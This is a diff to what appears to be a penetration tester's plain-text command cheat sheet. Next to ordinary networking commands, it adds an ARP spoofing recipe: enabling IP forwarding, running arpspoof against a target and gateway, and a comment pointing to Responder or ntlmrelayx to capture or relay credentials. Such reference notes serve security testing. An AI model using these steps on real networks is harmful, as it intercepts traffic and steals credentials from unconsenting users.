@@ -281,6 +281,11 @@ iface eth0 inet static
 systemctl restart networking.service            Restart networking
 
 curl -ikL ifconfig.me                           Show external IP
+
+ARP spoofing (enable forwarding first):
+    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+    sudo arpspoof -i eth0 -t <target IP> <gateway IP>
+    # Run Responder or ntlmrelayx while on-path — see ad-attacks.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Processes
